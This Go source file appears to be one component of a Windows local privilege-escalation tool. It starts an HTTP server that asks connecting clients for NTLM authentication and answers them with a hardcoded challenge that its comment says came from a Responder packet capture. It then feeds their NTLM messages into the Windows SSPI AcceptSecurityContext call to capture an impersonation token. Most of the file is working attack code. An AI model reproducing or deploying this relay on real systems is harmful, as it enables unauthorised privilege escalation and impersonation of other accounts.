package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Grabbed from a pcap of responder for convenience
const (
	CHALLENGE = "TlRMTVNTUAACAAAABgAGADgAAAAFAomih5Y9EpIdLmMAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA=="
)

type _SecHandle struct {
	dwLower uintptr
	dwUpper uintptr
}

type SecHandle _SecHandle
type CredHandle SecHandle
type CtxtHandle SecHandle

type _SecBufferDesc struct {
	ulVersion uint32
	cBuffers  uint32
	pBuffers  *SecBuffer
}

type SecBufferDesc _SecBufferDesc

type _SecBuffer struct {
	cbBuffer   uint32
	BufferType uint32
	pvBuffer   uintptr
}

type SecBuffer _SecBuffer

type SECURITY_INTEGER struct {
	LowPart  uint32
	HighPart int32
}

type TimeStamp SECURITY_INTEGER

type HTTPNTLMNegotiator struct {
	Host                string
	Port                int
	Chan                chan NegotiatorResult
	HCred               CredHandle
	secClientBufferDesc SecBufferDesc
	secServerBufferDesc SecBufferDesc
	secClientBuffer     SecBuffer
	secServerBuffer     SecBuffer
}

func (negotiator HTTPNTLMNegotiator) Serve() (*windows.Token, error) {
	go http.ListenAndServe(negotiator.Host+":"+strconv.Itoa(negotiator.Port), &negotiator)

	fmt.Println("[+] Started HTTP NTLM negotiator")
	result := <-negotiator.Chan

	return result.ImpersonationToken, result.Error
}

func (negotiator HTTPNTLMNegotiator) Trigger() bool {
	return true
}

// TODO add cookie jar/session tracking. Not really a necessity because there's only one target. However it would be nice to account for random network traffic.
func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *http.Request) {
	ntlmHash := req.Header.Get("Authorization")

	if len(ntlmHash) == 0 {
		res.Header().Set("WWW-Authenticate", "NTLM")
		res.WriteHeader(http.StatusUnauthorized)
		fmt.Println("[+] " + req.RemoteAddr + " connect")
		return
	}

	bytes, err := base64.StdEncoding.DecodeString(ntlmHash[5:])
	ntlmLoc := ParseNTLM(bytes)
	ntlmBytes := bytes[ntlmLoc : len(bytes)-ntlmLoc]

	if ntlmLoc == -1 || err != nil {
		res.Header().Set("WWW-Authenticate", "NTLM")
		res.WriteHeader(http.StatusUnauthorized)
		fmt.Println("[+] " + req.RemoteAddr + " connect")
	} else {
		messageType := bytes[ntlmLoc+8]
		switch messageType {
		case 1:
			res.Header().Set("WWW-Authenticate", "NTLM "+CHALLENGE)
			res.WriteHeader(http.StatusUnauthorized)
			fmt.Println("[+] " + req.RemoteAddr + " negotiate " + ntlmHash)
		case 3:
			res.Header().Set("WWW-Authenticate", "NTLM")
			res.WriteHeader(http.StatusOK)
			fmt.Println("[+] " + req.RemoteAddr + " authenticated")
		}

		err := negotiator.HandleNTLM(ntlmBytes, messageType)

		if err != nil {
			fmt.Println(err)
		}
	}
	//negotiator.Chan <- HTTPNTLMNegotiatorResult{nil, nil}
}

func (negotiator *HTTPNTLMNegotiator) HandleNTLM(ntlmBytes []byte, msgType byte) error {
	switch msgType {
	case 1:
		ptsExpiry := TimeStamp{}
		_, _, err := acquireCredentialsHandle.Call(0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Negotiate"))), SECPKG_CRED_INBOUND, 0, 0, 0, 0, uintptr(unsafe.Pointer(&negotiator.HCred)), uintptr(unsafe.Pointer(&ptsExpiry)))

		if err != syscall.Errno(0) {
			fmt.Println("[!] Failed to acquire credential handle")
			return err
		}

		InitTokenContextBuffer(&negotiator.secClientBufferDesc, &negotiator.secClientBuffer)
		InitTokenContextBuffer(&negotiator.secServerBufferDesc, &negotiator.secServerBuffer)

		var phContext windows.Handle
		var fContextAttr uint32
		var tsContextExpiry TimeStamp

		negotiator.secClientBuffer.cbBuffer = uint32(len(ntlmBytes))
		negotiator.secClientBuffer.pvBuffer = uintptr(unsafe.Pointer(&ntlmBytes[0]))

		_, _, err = acceptSecurityContext.Call(
			uintptr(unsafe.Pointer(&negotiator.HCred)),
			0,
			uintptr(unsafe.Pointer(&negotiator.secClientBufferDesc)),
			ASC_REQ_ALLOCATE_MEMORY|ASC_REQ_CONNECTION,
			SECURITY_NATIVE_DREP,
			uintptr(phContext),
			uintptr(unsafe.Pointer(&negotiator.secServerBufferDesc)),
			uintptr(unsafe.Pointer(&fContextAttr)),
			uintptr(unsafe.Pointer(&tsContextExpiry)),
		)

		if err != syscall.Errno(0) {
			fmt.Println("[!] Error accepting security context")
			return err
		}
	case 3:
		InitTokenContextBuffer(&negotiator.secClientBufferDesc, &negotiator.secClientBuffer)
		InitTokenContextBuffer(&negotiator.secServerBufferDesc, &negotiator.secServerBuffer)
	}

	return nil
}

func InitTokenContextBuffer(pSecBufferDesc *SecBufferDesc, pSecBuffer *SecBuffer) {
	pSecBuffer.BufferType = SECBUFFER_TOKEN
	pSecBuffer.cbBuffer = 0
	pSecBuffer.pvBuffer = 0
	pSecBufferDesc.ulVersion = SECBUFFER_VERSION
	pSecBufferDesc.cBuffers = 1
	pSecBufferDesc.pBuffers = pSecBuffer
}

func ParseNTLM(bytes []byte) int {
	pattern := [7]byte{0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50}
	pIdx := 0

	for i, v := range bytes {
		if v == pattern[pIdx] {
			pIdx++
			if pIdx == 7 {
				return i - 6
			}
		} else {
			pIdx = 0
		}
	}

	return -1
}
